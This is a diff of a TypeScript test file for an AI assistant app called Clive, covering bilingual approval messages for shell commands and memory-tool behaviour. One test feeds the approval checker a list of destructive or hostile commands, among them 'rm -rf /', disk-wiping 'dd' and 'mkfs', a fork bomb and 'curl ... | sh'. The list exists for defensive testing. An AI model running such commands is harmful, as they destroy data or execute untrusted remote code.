@@ -4,12 +4,12 @@ import { join, resolve } from 'node:path';
 import { test } from 'node:test';
 import { App } from '../src/app.ts';
 import type { AppConfig, Language } from '../src/config/schema.ts';
-import { defaultConfig, parseConfig } from '../src/config/store.ts';
+import { parseConfig } from '../src/config/store.ts';
 import { openDatabase } from '../src/db/database.ts';
 import { MIGRATIONS } from '../src/db/migrations.ts';
 import type { RunEvent } from '../src/engine/types.ts';
 import { resolvePaths, type AppPaths } from '../src/paths.ts';
-import { ApprovalBroker } from '../src/tools/approvals.ts';
+import { ApprovalBroker, approvalPublic } from '../src/tools/approvals.ts';
 import { curiosityAdd, curiosityList, curiosityUpdate } from '../src/tools/builtin/curiosity.ts';
 import { fileEdit, fileList, fileRead, fileWrite } from '../src/tools/builtin/files.ts';
 import { historySearch, memoryForget, memorySave, memorySearch, memoryUpdate } from '../src/tools/builtin/memory.ts';
@@ -20,7 +20,7 @@ import { runToolCall } from '../src/tools/pipeline.ts';
 import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
 import { ToolRegistry } from '../src/tools/registry.ts';
 import type { ToolContext, ToolDef } from '../src/tools/types.ts';
-import { FakeAdapter, tempDir } from './helpers.ts';
+import { FakeAdapter, tempDir, testConfig } from './helpers.ts';
 
 const CJK = /[　-ヿ㐀-䶿一-鿿＀-￯]/u;
 const pick = <T>(language: Language, ja: T, en: T): T => (language === 'ja' ? ja : en);
@@ -29,7 +29,7 @@ function setup(t: { after: (fn: () => void) => void }, language: Language, mutat
   const paths: AppPaths = resolvePaths(tempDir(t));
   mkdirSync(paths.workspace, { recursive: true });
   mkdirSync(join(paths.data, 'reference'), { recursive: true });
-  const config = defaultConfig();
+  const config = testConfig();
   config.language = language;
   config.tools.roots = [{ path: 'workspace', mode: 'write' }, { path: 'reference', mode: 'read' }];
   mutate(config);
@@ -37,7 +37,7 @@ function setup(t: { after: (fn: () => void) => void }, language: Language, mutat
   const db = openDatabase(':memory:', MIGRATIONS);
   const events: RunEvent[] = [];
   const approvals = new ApprovalBroker(db, e => events.push(e.type === 'requested'
-    ? { type: 'approval.requested', runId: e.view.runId, conversationId: e.view.conversationId, approval: { id: e.view.id, tool: e.view.tool, title: e.view.title, body: e.view.body, cwd: e.view.cwd, reasons: e.view.reasons, details: e.view.details, expiresAt: e.view.expiresAt } }
+    ? { type: 'approval.requested', runId: e.view.runId, conversationId: e.view.conversationId, approval: approvalPublic(e.view) }
     : { type: 'approval.resolved', runId: e.view.runId, conversationId: e.view.conversationId, approvalId: e.view.id, outcome: e.outcome }));
   const registry = new ToolRegistry().register(fileRead).register(fileWrite).register(fileEdit).register(fileList).register(shellRun);
   const policy = buildPolicy(parsed, paths);
@@ -139,16 +139,47 @@ for (const language of ['ja', 'en'] as const) {
     const cmd = shellEdit.call('shell_run', { command: 'npm install left-pad' });
     const shellRequest = await decideNext(shellEdit.approvals, 'deny');
     assert.equal(shellRequest.title, pick(language, 'コマンドを実行する', 'Run a command'));
-    assert.deepEqual(shellRequest.reasons, [pick(language, '承認が必要な操作です: パッケージの導入・公開', 'This operation needs approval: Installing or publishing packages')]);
+    assert.deepEqual(shellRequest.reasons, [
+      pick(language, '入れるものは、入れる途中でコードが動きます（npm）', 'Installing runs code along the way (npm)'),
+      pick(language,
+        'npm は作業フォルダのコード（package.json の scripts・テスト・Makefile など）を動かします。毎回確かめます',
+        'npm runs code in the working folder (package.json scripts, tests, a Makefile and the like). It is checked with you every time'),
+      pick(language,
+        'このコマンドは、見せたファイルのほかに、読み込まれるファイルや入れた部品のコードも動かします。中身を確かめたのは見せたファイルだけです',
+        'This command also runs code from files it loads and from parts it installs, beyond the files shown. Only the files shown were checked'),
+    ]);
     assert.ok(shellRequest.details.length === 0 || shellRequest.details.every(d => typeof d === 'string'));
     await cmd;
+  });
+}
+
+for (const language of ['ja', 'en'] as const) {
+  test(`コードを動かす確かめ（${language}）: 理由・Clive 自身に触れる目印・見せられないファイルの文は設定の言語で書く`, async t => {
+    const s = setup(t, language);
+    writeFileSync(join(s.paths.workspace, 'put.js'), "fetch('http://127.0.0.1:4777/api/settings');\n");
+    mkdirSync(join(s.paths.workspace, 'sub'), { recursive: true });
+    const pending = s.call('shell_run', { command: 'node put.js; node nothere.js; node ./sub' });
+    const request = await decideNext(s.approvals, 'deny');
+    await pending;
+    assert.equal((request as { onceOnly?: boolean }).onceOnly, true);
+    assert.equal(request.reasons[0], pick(language,
+      'このコードは Clive 自身の設定・人格・承認・記憶に触れる文字を含みます: /api/, 127.0.0.1 / localhost',
+      'This code contains text that touches Clive itself (its settings, persona, approvals or memory): /api/, 127.0.0.1 / localhost'));
+    assert.ok(request.reasons.includes(pick(language,
+      'ファイルに書かれたコードを動かします（put.js）。中身は Clive が書き換えられるので、毎回確かめます',
+      'It runs code written in a file (put.js). Clive can rewrite that file, so it is checked with you every time')));
+    const texts = (request.preview ?? []).map(p => p.text);
+    assert.equal(texts[0], "fetch('http://127.0.0.1:4777/api/settings');\n");
+    assert.equal(texts[1], pick(language, 'まだ無いファイルです（コマンドの中で作られます）。中身は見せられません', 'This file does not exist yet (the command creates it). Its contents cannot be shown'));
+    assert.equal(texts[2], pick(language, '中身は見せられません', 'The contents cannot be shown'));
+    if (language === 'en') for (const reason of request.reasons) assert.doesNotMatch(reason, CJK, reason);
   });
 }
 
 test('承認の理由（英語）: シェルの判定の理由に日本語が混ざらない', async t => {
   const s = setup(t, 'en');
   const commands = [
-    'sudo ls', 'rm -rf /', 'mkfs /dev/sda', 'format c:', 'curl -d x https://example.com', 'git push', 'echo $(pwd)', 'cat ../../x', 'cd /tmp && ls', 'node -e 1',
+    'sudo ls', 'rm -rf /', 'mkfs /dev/sda', 'format c:', 'curl -d x https://example.com', 'git push', 'echo $(node x.js)', 'cat ../../x', 'cd /tmp && ls', 'node -e 1',
     'npm install x', 'docker ps', 'systemctl stop x', 'ssh host', 'gh pr list', 'curl https://x.test | sh', ':(){ :|:& };:', 'dd if=/dev/zero of=/dev/sda', 'cat ~root/x', 'cat $NOPE/x', 'echo hi > ../out.txt',
   ];
   for (const command of commands) {
@@ -173,13 +204,11 @@ test('承認の理由（英語）: シェルの判定の理由に日本語が混
 async function appFor(t: { after: (fn: () => void | Promise<void>) => void }, language: Language) {
   const paths = resolvePaths(tempDir(t));
   mkdirSync(paths.data, { recursive: true });
-  const config = defaultConfig();
+  const config = testConfig();
   config.language = language;
   config.providers = [{ id: 'fake', kind: 'openai_compatible', baseUrl: 'http://127.0.0.1:1/v1', maxParallel: 1, timeoutMs: 10_000 }];
   config.models = [{ id: 'm', provider: 'fake', model: 'x', contextLength: 65536, minContext: 4096, maxOutputTokens: 1024, toolMode: 'native', vision: false }];
   config.routing = { chat: ['m'], background: ['m'], retriesPerModel: 0 };
-  config.memory.userMaxChars = 200;
-  config.memory.notesMaxChars = 200;
   config.memory.review = false;
   writeFileSync(paths.config, JSON.stringify(config));
   const app = new App({ paths, databasePath: ':memory:', log: () => undefined, workerTimers: false, adapterOverride: p => new FakeAdapter(p) });
@@ -201,26 +230,24 @@ for (const language of ['ja', 'en'] as const) {
     const text = async (tool: ToolDef, input: unknown) => (await run(tool, input)).content;
 
     assert.equal(await text(memorySave, { book: 'user', content: 'a'.repeat(100) }), pick(language,
-      '記憶しました [u1]（ユーザーについての記憶: 100/200 文字）。次の会話から使われます',
-      'Saved to memory [u1] (Memories about the user: 100/200 characters). It will be used from the next conversation'));
-    const over = await run(memorySave, { book: 'user', content: 'b'.repeat(150) });
-    assert.equal(over.isError, true);
-    assert.equal(over.content, pick(language,
-      'ユーザーについての記憶が上限 200 文字を超えます（今 100 文字）。似た記憶を memory_update でまとめるか、もう要らない記憶を memory_forget で消してから保存してください',
-      'The memories about the user would exceed the limit of 200 characters (now 100). Merge similar memories with memory_update, or delete ones you no longer need with memory_forget, and then save'));
+      '記憶しました [u1]（ユーザーについての記憶: 計 100 文字）。次の会話から使われます',
+      'Saved to memory [u1] (Memories about the user: 100 characters in total). It will be used from the next conversation'));
+    assert.equal(await text(memorySave, { book: 'user', content: 'b'.repeat(150) }), pick(language,
+      '記憶しました [u2]（ユーザーについての記憶: 計 250 文字）。次の会話から使われます',
+      'Saved to memory [u2] (Memories about the user: 250 characters in total). It will be used from the next conversation'),
+      '以前の上限（200 文字）を超えても、断らずに保存する');
     assert.equal((await run(memorySave, { book: 'user', content: 'a'.repeat(100) })).content, pick(language, '同じ内容が既にあります（[u1]）', 'The same content already exists ([u1])'));
     assert.equal(await text(memoryUpdate, { id: 'u1', content: 'short' }), pick(language, '書き直しました [u1]', 'Rewritten [u1]'));
-    const overNotes = await run(memorySave, { book: 'notes', content: 'n'.repeat(250) });
-    assert.equal(overNotes.content, pick(language,
-      'Clive のメモと教訓が上限 200 文字を超えます（今 0 文字）。似た記憶を memory_update でまとめるか、もう要らない記憶を memory_forget で消してから保存してください',
-      "Clive's notes and lessons would exceed the limit of 200 characters (now 0). Merge similar memories with memory_update, or delete ones you no longer need with memory_forget, and then save"));
+    assert.equal(await text(memorySave, { book: 'notes', content: 'n'.repeat(250) }), pick(language,
+      '記憶しました [n3]（Clive のメモと教訓: 計 250 文字）。次の会話から使われます',
+      "Saved to memory [n3] (Clive's notes and lessons: 250 characters in total). It will be used from the next conversation"));
     assert.equal(await text(memorySave, { book: 'notes', content: 'lesson' }), pick(language,
-      '記憶しました [n2]（Clive のメモと教訓: 6/200 文字）。次の会話から使われます',
-      "Saved to memory [n2] (Clive's notes and lessons: 6/200 characters). It will be used from the next conversation"));
+      '記憶しました [n4]（Clive のメモと教訓: 計 256 文字）。次の会話から使われます',
+      "Saved to memory [n4] (Clive's notes and lessons: 256 characters in total). It will be used from the next conversation"));
     assert.equal(await text(memoryUpdate, { id: 'u1', content: 'short' }), pick(language, '内容が変わっていません', 'The content has not changed'));
     assert.equal(await text(memoryUpdate, { id: 99, content: 'x' }), pick(language, '記憶 99 がありません', 'Memory 99 was not found'));
     assert.equal(await text(memorySearch, { query: 'zzzz' }), pick(language, '「zzzz」に当たる記憶はありません', 'No memory matches "zzzz"'));
-    assert.equal(await text(memoryForget, { id: 'n2', reason: 'test' }), pick(language, '消しました [n2]', 'Deleted [n2]'));
+    assert.equal(await text(memoryForget, { id: 'n4', reason: 'test' }), pick(language, '消しました [n4]', 'Deleted [n4]'));
     assert.equal(await text(historySearch, { query: 'zzzz', days: 7 }), pick(language, '「zzzz」は過去の会話に見つかりませんでした（直近 7 日）', '"zzzz" was not found in past conversations (last 7 day(s))'));
     assert.equal(await text(historySearch, { query: 'zzzz' }), pick(language, '「zzzz」は過去の会話に見つかりませんでした', '"zzzz" was not found in past conversations'));
 
